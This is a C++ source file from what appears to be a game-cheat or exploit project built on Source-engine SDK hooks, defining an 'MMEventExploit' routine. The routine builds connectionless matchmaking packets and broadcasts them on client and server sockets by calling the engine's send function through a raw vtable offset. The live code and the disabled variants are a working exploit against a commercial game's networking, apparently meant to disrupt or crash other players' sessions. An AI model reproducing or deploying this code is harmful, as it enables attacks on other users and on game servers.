#if 1
#include "MMEvent.h"

#include "../../ClientHooks.h"
#include "../../EngineHooks.h"
#include "../../SDK/SDK/IMatchFramework.h"

#include "../../SDK/OsirisSDK/NetworkChannel.h"

#include "../../SDK/OsirisSDK/KeyValues.h"

#include "../../SDK/SDK/INetSupport.h"

//struct netpacket_t;
#include "../OTHER/Debug.h"


extern int CUSTOM_NET_SendLong(void* chan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize, bool Encrypt = false, bool Decrypt = true);
void SendPacket(INetSupport::NetworkSocket_t eSock)
{
	char buf[INetSupport::NC_MAX_ROUTABLE_PAYLOAD];
	bf_write msg(buf, sizeof(buf));

	msg.WriteLong(CONNECTIONLESS_HEADER);
	msg.WriteLong(0);
	msg.WriteLong(interfaces->netSupport->GetEngineBuildNumber());

	msg.WriteLong(INetSupport::NC_MAX_ROUTABLE_PAYLOAD);
	//msg.WriteBytes(0, 0);
	//Assert(!msg.IsOverflowed());
#if 0
	// Special case when encoding binary data
	KeyValues* kvPtr = pMsg->findKey("binary/ptr");
	KeyValues* kvSize = pMsg->findKey("binary/size");
	if (kvPtr && kvSize)
	{
		void* pvData = kvPtr->GetPtr();
		int nSize = kvSize->GetInt();

		if (pvData && nSize)
		{
			msg.WriteLong(nSize);
			if (!msg.WriteBytes(pvData, nSize))
			{
				Assert(0);
				return;
			}
		}
		else
		{
			msg.WriteLong(0);
		}
	}
	else
	{
		msg.WriteLong(0);
	}
	Assert(!msg.IsOverflowed());
#endif
	// Prepare the address
	netadr_t inetAddr;
	inetAddr.SetType(NA_BROADCAST);
	inetAddr.SetPort(0);
	// Sending the connectionless packet
	//uintptr_t INetSupport = *(uintptr_t*)(Memory::findPattern_ex(L"matchmaking", "\xFF\x75\x10\xFF\x52\x4C") + 1);


	int result = (*(int(__stdcall**)(int, unsigned char*, netadr_t * ,int))(*(DWORD*)DWORD(interfaces->netSupport) + 76))(
		eSock,
		msg.GetData(),
		&inetAddr,
		msg.GetNumBytesWritten());

	//interfaces->netSupport->SendPacket(NULL, eSock,
	//	inetAddr, msg.GetData(), msg.GetNumBytesWritten());
}


#if 1
void MMEventExploit::SendEvent()
{
#if 0
	char* pPacket[MAX_ROUTABLE_PAYLOAD];
	bf_write msg(pPacket, MAX_ROUTABLE_PAYLOAD);
	msg.WriteLong(LittleLong((int)CONNECTIONLESS_HEADER));
	msg.WriteByte(ONNETLANCONNECTIONLESS_HEADER);
	//msg.WriteLong(LittleLong((int)0));
	msg.WriteLong(interfaces->netSupport->GetEngineBuildNumber());
	VCON("Engine build #%d", interfaces->netSupport->GetEngineBuildNumber());
	msg.WriteLong(INT_MAX);
	CUSTOM_NET_SendLong((void*)ClientHooks::g_pNetChannel, (unsigned char*)pPacket, 576, 576);
#endif
	SendPacket(INetSupport::NS_SOCK_CLIENT);
	SendPacket(INetSupport::NS_SOCK_SERVER);

}
#endif

#endif



#if 0

void SendPacket(KeyValues* pMsg, char const* szAddress /*= NULL*/, INetSupport::NetworkSocket_t eSock)
	{
		char buf[INetSupport::NC_MAX_ROUTABLE_PAYLOAD];
		bf_write msg(buf, sizeof(buf));

		msg.WriteLong(CONNECTIONLESS_HEADER);
		msg.WriteLong(0);
		msg.WriteLong(interfaces->netSupport->GetEngineBuildNumber());

		CUtlBuffer data;
		data.ActivateByteSwapping(true);
		pMsg->WriteAsBinary(data);

		msg.WriteLong(data.TellMaxPut());
		msg.WriteBytes(data.Base(), data.TellMaxPut());
		Assert(!msg.IsOverflowed());

		// Special case when encoding binary data
		KeyValues* kvPtr = pMsg->findKey("binary/ptr");
		KeyValues* kvSize = pMsg->findKey("binary/size");
		if (kvPtr && kvSize)
		{
			void* pvData = kvPtr->GetPtr();
			int nSize = kvSize->GetInt();

			if (pvData && nSize)
			{
				msg.WriteLong(nSize);
				if (!msg.WriteBytes(pvData, nSize))
				{
					Assert(0);
					return;
				}
			}
			else
			{
				msg.WriteLong(0);
			}
		}
		else
		{
			msg.WriteLong(0);
		}
		Assert(!msg.IsOverflowed());

		// Prepare the address
		netadr_t inetAddr;
		if (szAddress)
		{
			if (szAddress[0] == '*' && szAddress[1] == ':')
			{
				inetAddr.SetType(NA_BROADCAST);
				inetAddr.SetPort(atoi(szAddress + 2));
			}
			else
			{
				inetAddr.SetFromString(szAddress);
			}
		}
		else
		{
			inetAddr.SetType(NA_BROADCAST);
			inetAddr.SetPort(0);
		}

		// Check if broadcasts are allowed
		//if (inetAddr.GetType() == NA_BROADCAST &&
		//	!net_allow_multicast.GetBool())
		//	return;

		// Sending the connectionless packet
		interfaces->netSupport->SendPacket(NULL, eSock,
			inetAddr, msg.GetData(), msg.GetNumBytesWritten());
	}
#endif


